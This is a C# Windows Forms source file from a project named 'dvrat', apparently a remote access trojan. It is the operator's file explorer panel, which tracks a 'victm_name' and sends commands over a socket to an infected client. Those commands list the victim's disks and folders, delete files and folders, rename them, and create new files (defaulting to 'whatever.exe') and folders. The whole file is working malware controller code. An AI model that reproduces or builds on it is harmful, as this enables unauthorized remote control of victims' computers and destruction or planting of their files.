using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using dvrat.modules;
namespace dvrat
{
    public partial class file_explorer_form : Form
    {
        public string[] _MAIN_DISKS;
        public string victm_name = "";
        string last_folder = "";
        string _MAIN_DIR = "";
        Socket _s;
        Form1 _parent;
        rename_dialog rnm_frm;
        int selected_list = 0;
        public file_explorer_form(Socket s, Form1 parent,string main_dir)
        {
            this._MAIN_DIR = main_dir;
            this._s = s;
            this._parent = parent;
            InitializeComponent();
        }

       
        private void file_explorer_form_Load(object sender, EventArgs e)
        {
            this.Text = $"File Explorer [{this.victm_name}]";
            listView1.Columns[listView1.Columns.Count - 1].Width = -2;
            listView1.Columns[0].Width = 140;
            listView1.Columns[1].Width = 202 - listView1.Columns[0].Width - 25;
      
        }

        public void _err(string err_message)
        {
            err_label.Invoke(new MethodInvoker(() =>
            {
                err_label.Text = err_message;
            }));
        }

        public static bool IsRecognisedImageFile(string fileName)
        {
            string targetExtension = System.IO.Path.GetExtension(fileName);
            if (String.IsNullOrEmpty(targetExtension))
                return false;
            else
                targetExtension = "*" + targetExtension.ToLowerInvariant();

            List<string> recognisedImageExtensions = new List<string>();

            foreach (System.Drawing.Imaging.ImageCodecInfo imageCodec in System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders())
                recognisedImageExtensions.AddRange(imageCodec.FilenameExtension.ToLowerInvariant().Split(";".ToCharArray()));

            foreach (string extension in recognisedImageExtensions)
            {
                if (extension.Equals(targetExtension))
                {
                    return true;
                }
            }
            return false;
        }


      
        public void load_main_files(JObject files)
        {
            new Thread(new ThreadStart(new Action(() =>
            {

                listView1.Invoke(new MethodInvoker(() =>
                {

                    for (int i = 0; i < this._MAIN_DISKS.Length; i++)
                    {
                        string disk = this._MAIN_DISKS[i];
                        if (!disk.Equals("\n") && !disk.Equals(" ") && !disk.Equals(""))
                        {
                            ListViewItem row1_ = new ListViewItem();
                            row1_.Text = disk;
                            row1_.SubItems.Add("DISK");
                            row1_.ImageIndex = 2;
                            listView1.Items.Add(row1_);
                        }
                    }
                    var attributes = files["DIR"];
                    foreach (var pair in attributes)
                    {
                        if (pair.ToString().Equals(".") || pair.ToString().Equals(".."))
                        {

                        }
                        else
                        {
                            ListViewItem row1 = new ListViewItem();
                            row1.Text = pair.ToString();
                            row1.SubItems.Add("DIR");
                            row1.ImageIndex = 1;
                            listView1.Items.Add(row1);
                        }
                        
                    }

                }));
                string temp = Path.GetTempFileName(), withexttemp = "";
                using (Stream fileStream = File.OpenWrite(temp)) { fileStream.Close(); }

                foreach (JProperty x in (JToken)files)
                {
                    listView1.Invoke(new MethodInvoker(() => {
                        ListViewItem row1 = new ListViewItem();
                        row1.Text = x.Name.ToString();
                        row1.SubItems.Add("FILE");
                        //Icon should set from my pc
                        // so the idea is create a temp file with the same Extension then extract it icon then set it so simple
                        string file_ext = Path.GetExtension(x.Name.ToString());
                        try
                        {
                            file_ext = Path.GetExtension(x.Name.ToString());
                            withexttemp = Path.ChangeExtension(temp, file_ext);
                            File.Move(temp, withexttemp);
                            temp = withexttemp;
                        }
                        catch (Exception ex)
                        {
                            //just pass
                        }
                        try
                        {
                            Icon ico = System.Drawing.Icon.ExtractAssociatedIcon(withexttemp);
                            imageList1.Images.Add(ico);
                            row1.ImageIndex = imageList1.Images.Count - 1;
                        }
                        catch (Exception ex)
                        {
                            row1.ImageIndex = 0;
                        }
                        listView1.Items.Add(row1);

                    }));



                }
                File.Delete(temp);

            }))).Start();
        }


        public void load_files(JObject files)
        {
            //TODO: add icons from my local pc
            new Thread(new ThreadStart(new Action(() =>
            {

                listView2.Invoke(new MethodInvoker(() =>
                {
                    ListViewItem row1_ = new ListViewItem();
                    row1_.Text = ".."/*go back folder*/;
                    row1_.SubItems.Add("DIR");
                    row1_.SubItems.Add("");
                    row1_.ImageIndex = 1;
                    listView2.Items.Add(row1_);
                    listView2.Refresh();
                    var attributes = files["DIR"];
                    foreach (var pair in attributes)
                    {
                        if (pair.ToString().Equals(".") || pair.ToString().Equals(".."))
                        {

                        }
                        else
                        {
                            ListViewItem row1 = new ListViewItem();
                            row1.Text = pair.ToString();
                            row1.SubItems.Add("DIR");
                            row1.SubItems.Add("");
                            row1.ImageIndex = 1;
                            listView2.Items.Add(row1);
                            listView2.Refresh();
                        }

                    }

                }));


                listView2.Invoke(new MethodInvoker(() => {
                        string temp = Path.GetTempFileName(), withexttemp = "",file_ext = "";
                        using (Stream fileStream = File.OpenWrite(temp)) { fileStream.Close(); }
                        foreach (JProperty x in (JToken)files)
                        {
                            
                            ListViewItem row1 = new ListViewItem();
                            row1.Text = x.Name.ToString();
                            row1.SubItems.Add("FILE");
                            int size = 0;
                            bool isInt = Int32.TryParse(x.Value.ToString(), out size);
                            row1.SubItems.Add(isInt ? this._parent.DataSize(size) : "UNKNOWN");
                            //Icon should set from my pc
                            // so the idea is create a temp file with the same Extension then extract it icon then set it so simple
                            try
                            {
                                file_ext = Path.GetExtension(x.Name.ToString());
                                withexttemp = Path.ChangeExtension(temp, file_ext);
                                File.Move(temp, withexttemp);
                                temp = withexttemp;
                            }
                            catch (Exception ex)
                            {
                                //just pass
                            }
                            try
                            {
                                Icon ico = System.Drawing.Icon.ExtractAssociatedIcon(withexttemp);
                                imageList1.Images.Add(ico);
                                row1.ImageIndex = imageList1.Images.Count - 1;
                            }
                            catch (Exception ex)
                            {
                                row1.ImageIndex = 0;
                            }
                            listView2.Items.Add(row1);
                            listView2.Refresh();
                        
                        }
                        File.Delete(temp);


                }));



            }))).Start();
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(new Action(() =>
            {
                listView2.Invoke(new MethodInvoker(() => {
                    listView2.SelectedItems.Clear();

                }));

            }))).Start();
        }


        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            try
            {
                if (!listView1.SelectedItems[0].SubItems[1].Text.Equals("DISK"))
                {
                    err_label.Text = "";
                    string path = $"{ _MAIN_DIR }\\{ listView1.SelectedItems[0].Text}";
                    listView2.Items.Clear();
                    path_label.Text = path;
                    last_folder = $"{listView1.SelectedItems[0].Text}";
                    this._parent.send_to_client(this._s, $"get_this_sub_main_path;\n{path}");
                }
                else
                {
                    err_label.Text = "";
                    listView2.Items.Clear();
                    string path = listView1.SelectedItems[0].Text;
                    path_label.Text = path;
                    last_folder = $"{listView1.SelectedItems[0].Text}";
                    this._parent.send_to_client(this._s, $"get_this_sub_main_path;\n{path}");


                }
            }
            catch (Exception)
            {
                MessageBox.Show("Choose a file\\folder !");
            }
            listView1.SelectedItems.Clear();
            listView2.SelectedItems.Clear();
        }

        private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {

            using (StringFormat sf = new StringFormat())
            {

                switch (e.Header.TextAlign)
                {
                    case HorizontalAlignment.Center:
                        sf.Alignment = StringAlignment.Center;
                        break;
                    case HorizontalAlignment.Right:
                        sf.Alignment = StringAlignment.Far;
                        break;
                }

          
                e.DrawBackground();

   
                using (Font headerFont = new Font("Helvetica", 25, FontStyle.Bold)) 
                {
                    e.Graphics.DrawString(e.Header.Text, headerFont, Brushes.Black, e.Bounds, sf);
                }
            }



        }

        private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;

        }

        private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            e.DrawDefault = true;

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private string currnt_path(string folder)
        {
            string path = $"{ path_label.Text }\\{ folder}";
            if (folder.Equals(".."))
            {
                listView2.Items.Clear();                
                                                                              /*   FOLDER WE NEED                     */
                                                                             /*           |                          */
                                                                            /*            3            2        1   */
                last_folder = path.Split('\\')[path.Split('\\').Length - 3 /* A:\FOLDER1\FOLDER2\CURRENT_FOLDER\.. */];
                return path;
            }
            else
            {

                listView2.Items.Clear();
                last_folder = folder;
                return path;

            }
        }

        private void listView2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            try
            {
                string folder = listView2.SelectedItems[0].Text;
                err_label.Text = "";
                string path = currnt_path(folder);
                // path = $"{ path_label.Text }\\{ listView2.SelectedItems[0].Text }";
                if (folder.Equals(".."))
                {
                    if (!path_label.Text.Split(':')[1].Equals("\\Users\\"))
                    {
                        try
                        {
                            path_label.Text = path_label.Text.Replace(
                                    path.Split('\\')[path.Split('\\').Length - 2]
                                    , ""
                                );
                        }
                        catch (Exception)
                        {
                            path_label.Text = path_label.Text.Replace(path.Split('\\')[path.Split('\\').Length - 3], "");
                        }

                    }
                    else
                    {
                        path_label.Text = path_label.Text.Replace("\\Users\\", "");
                    }
                    try
                    {
                        path_label.Text = path_label.Text.Replace("\\\\", "\\");
                    }

                    catch (Exception)
                    {
                    }
                }
                else
                {
                    path_label.Text = path;

                    try
                    {
                        path_label.Text = path_label.Text.Replace("\\\\", "\\");
                    }
                    catch (Exception)
                    {
                        //pass
                    }
                }
                this._parent.send_to_client(this._s, $"get_this_sub_path;\n{path}");
            }catch(Exception)
            {
                MessageBox.Show("Choose a file\\folder !");
            }
            listView1.SelectedItems.Clear();
            listView2.SelectedItems.Clear();

        }

        public string TrimLastCharacter(string str, char character)
        {
            if (string.IsNullOrEmpty(str) || str[str.Length - 1] != character)
            {
                return str;
            }
            return str.Substring(0, str.Length - 1);
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //TODO: AFTER EXEC REFRESH
            string rmdir = "#path";
            string rmfile = "#file";
            try
            {
   
                if (listView1.SelectedItems[0].Text.Equals(".."))
                {
                    MessageBox.Show("=) ?");
                }
                else
                {
                    err_label.Text = "";
                    string type = listView1.SelectedItems[0].SubItems[1].Text;
                    if (type.Equals("DIR")) {
                        string path = $"{ _MAIN_DIR }\\{ listView1.SelectedItems[0].Text}";
                        last_folder = $"{listView1.SelectedItems[0].Text}";
                        this._parent.send_to_client(this._s, $"delete_folder;\n{rmdir.Replace("#path", path)}");
                        listView1.SelectedItems.Clear();
                        listView1.Items.Clear();
                        listView2.Items.Clear();
                        this._parent.send_to_client(this._s, $"start_fileexplorer;\n{_MAIN_DIR}");
                 
                    }
                    else
                    {

                    }
                }
            }
            catch (Exception)
            {
                try
                {

                    if (listView2.SelectedItems[0].Text.Equals(".."))
                    {
                        MessageBox.Show("=) ?");
                    }
                    else
                    {
                        err_label.Text = "";
                        string type = listView2.SelectedItems[0].SubItems[1].Text;
                        if (type.Equals("DIR"))
                        {
                            string path = currnt_path(listView2.SelectedItems[0].Text);
                            rmdir = rmdir.Replace("#path", path);
                            char last_char = rmdir[rmdir.Length - 1];

                            if (last_char.Equals('\\'))
                            {
                                rmdir = TrimLastCharacter(rmdir, '\\');
                            }
                            Thread.Sleep(300);
                            this._parent.send_to_client(this._s, $"delete_folder;\n{rmdir}");
                            string path_nd = path_label.Text;
                            Thread.Sleep(300);
                            listView2.SelectedItems.Clear();
                            listView2.Items.Clear();
                            this._parent.send_to_client(this._s, $"get_this_sub_path;\n{path_nd}");
                          
                        }
                        else
                        {
                            string path = currnt_path(listView2.SelectedItems[0].Text);
                            rmfile = rmfile.Replace("#file", path);
                            char last_char = rmfile[rmfile.Length - 1];

                            if (last_char.Equals('\\'))
                            {
                                rmfile = TrimLastCharacter(rmfile, '\\');
                            }
                            Thread.Sleep(300);
                            this._parent.send_to_client(this._s, $"delete_file;\n{rmfile}");
                            string path_nd = path_label.Text;
                            Thread.Sleep(300);
                            listView2.SelectedItems.Clear();
                            listView2.Items.Clear();
                            this._parent.send_to_client(this._s, $"get_this_sub_path;\n{path_nd}");
                           
                        }
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("Choose a file\\folder !");
                }
            }
        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(new Action(() =>
            {
                listView1.Invoke(new MethodInvoker(() => {
                    listView1.SelectedItems.Clear();

                }));
            }))).Start();
        }

        private void listView2_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            new Thread(new ThreadStart(new Action(() =>
            {
                listView1.Invoke(new MethodInvoker(() => {
                    listView1.SelectedItems.Clear();

                }));
            }))).Start();
        }

        private void listView1_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            new Thread(new ThreadStart(new Action(() =>
            {
                listView2.Invoke(new MethodInvoker(() => { 
                listView2.SelectedItems.Clear();

                }));

            }))).Start();

        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string new_name = "";
            string old_name = "";
            //rename_folder;
            try
            {

                if (listView1.SelectedItems[0].Text.Equals(".."))
                {
                    MessageBox.Show("=) ?");
                }
                else
                {
                    err_label.Text = "";
                    string path = $"{ _MAIN_DIR }\\{ listView1.SelectedItems[0].Text}";
                    rnm_frm = new rename_dialog(path);
                    rnm_frm.ShowDialog();
                    old_name = path;
                    new_name = rnm_frm.new_name;
                    Thread.Sleep(300);
                    this._parent.send_to_client(this._s, $"rename_fl;\n{old_name}\n{new_name}");
                    string path_nd = path_label.Text;
                    Thread.Sleep(300);
                    listView2.SelectedItems.Clear();
                    listView2.Items.Clear();
                    this._parent.send_to_client(this._s, $"start_fileexplorer;\n{_MAIN_DIR}");
                }
            }
            catch (Exception)
            {
     
                try
                {

                    if (listView2.SelectedItems[0].Text.Equals(".."))
                    {
                        MessageBox.Show("=) ?");
                    }
                    else
                    {
                        err_label.Text = "";
                        string path = currnt_path(listView2.SelectedItems[0].Text);
                        rnm_frm = new rename_dialog(path);
                        rnm_frm.ShowDialog();
                        old_name = path;
                        new_name = old_name.Replace(old_name.Split('\\')[old_name.Split('\\').Length - 1], rnm_frm.new_name);
                        Thread.Sleep(300);
                        this._parent.send_to_client(this._s, $"rename_fl;\n{old_name}\n{new_name}");
                        string path_nd = path_label.Text;
                        Thread.Sleep(300);
                        listView2.SelectedItems.Clear();
                        listView2.Items.Clear();
                        this._parent.send_to_client(this._s, $"get_this_sub_path;\n{path_nd}");
                       
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("Choose a file\\folder !");
                }
            }
        }

        private void newfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //new_file;\n{file_path_to_create}
            string file_name = Microsoft.VisualBasic.Interaction.InputBox("Write a name for the file", "File name", "whatever.exe", 0, 0);
            if (selected_list == 2) 
            {
                string path_file = path_label.Text[path_label.Text.Length - 1] == '\\' ? $"{path_label.Text}{file_name}" : $"{path_label.Text}\\{file_name}";
                this._parent.send_to_client(this._s, $"new_file;\n{path_file}");
                listView2.Items.Clear();
                this._parent.send_to_client(this._s, $"get_this_sub_path;\n{path_label.Text}");
            }
            else
            {
                string path_file = $"{_MAIN_DIR}\\{file_name}";
                this._parent.send_to_client(this._s, $"new_file;\n{path_file}");
                listView1.Items.Clear();
                this._parent.send_to_client(this._s, $"start_fileexplorer;\n{_MAIN_DIR}");
            }
        }

        private void newFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string folder_name = Microsoft.VisualBasic.Interaction.InputBox("Write a name for the folder", "Folder name", "whatever", 0, 0);
            if (selected_list == 2)
            {
                string path_file = path_label.Text[path_label.Text.Length - 1] == '\\' ? $"{path_label.Text}{folder_name}" : $"{path_label.Text}\\{folder_name}";
                this._parent.send_to_client(this._s, $"new_folder;\n{path_file}");
                listView2.Items.Clear();
                this._parent.send_to_client(this._s, $"get_this_sub_path;\n{path_label.Text}");
            }
            else
            {
                string path_file = $"{_MAIN_DIR}\\{folder_name}";
                this._parent.send_to_client(this._s, $"new_folder;\n{path_file}");
                listView1.Items.Clear();
                this._parent.send_to_client(this._s, $"start_fileexplorer;\n{_MAIN_DIR}");
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (selected_list == 2)
            {
                listView2.Items.Clear();
                this._parent.send_to_client(this._s, $"get_this_sub_path;\n{path_label.Text}");
            }
            else
            {
                listView1.Items.Clear();
                this._parent.send_to_client(this._s, $"start_fileexplorer;\n{_MAIN_DIR}");
            }
        }

        private void listView1_MouseHover(object sender, EventArgs e)
        {
            selected_list = 1;
        }

        private void listView2_MouseHover(object sender, EventArgs e)
        {
            selected_list = 2;

        }

        private void listView1_MouseEnter(object sender, EventArgs e)
        {
            selected_list = 1;
        }

        private void listView2_MouseEnter(object sender, EventArgs e)
        {
            selected_list = 2;
        }

       
    }
}

